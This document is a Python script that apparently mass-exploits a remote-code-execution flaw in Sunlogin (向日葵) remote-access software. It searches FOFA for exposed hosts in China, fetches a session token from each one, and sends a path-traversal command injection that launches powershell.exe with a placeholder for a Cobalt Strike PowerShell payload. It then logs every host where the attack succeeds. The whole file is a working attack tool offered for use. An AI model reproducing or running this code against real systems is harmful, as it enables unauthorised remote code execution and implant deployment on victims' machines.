import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import base64
def main():
    pn=0
    index=0
    testStr = 'body="Verification failure" && country="CN"'
    b64 = str(base64.b64encode(testStr.encode('utf-8')), 'utf-8')

    pn+=1
    url='https://fofa.info/api/v1/search/all?email=你的邮箱&key=你的key&qbase64={}&size=10000'.format(b64)
    print(url)
    r=requests.get(url=url).json()['results']
    print(r)
    print(len(r))
    for i in r:
        ip=i[0]
        poc(ip)
def poc(ip):
    print(ip)
    url='http://{}/cgi-bin/rpc?action=verify-haras'.format(ip)
    headers={'Host':'{}'.format(ip),
             'Cache-Control':'max-age=0',
             'Upgrade-Insecure-Requests': '1',
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'Accept-Encoding': 'gzip, deflate',
             'Accept-Language': 'zh-CN,zh;q=0.9',
             'Connection': 'close'}
    try:
        r=requests.get(url,headers=headers,timeout=5).json()['verify_string']
    except:
        print('超时:',ip)
    else:
        print(r)
        exp(ip, verify_string=r)
def exp(ip,verify_string):
    url = 'http://{}/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+cs生成的powershell'.format(ip)
    headers = {'Host':'{}'.format(ip),
               'Cache-Control':'max-age=0',
               'Upgrade-Insecure-Requests':'1',
               'Cookie':'CID={}'.format(verify_string),
               'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
               'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
               'Accept-Encoding':'gzip, deflate',
               'Accept-Language':'zh-CN,zh;q=0.9',
               'Connection': 'close'}
    try:
        r=requests.get(url,headers=headers,timeout=2)
    except:
        print('exp超时:',ip)
    else:
        print('succ:',r.text)
        with open('向日葵REC_SUCC1115.txt','a+') as f:
            f.write(ip)
            f.write('\n')
if __name__ == '__main__':
    main()
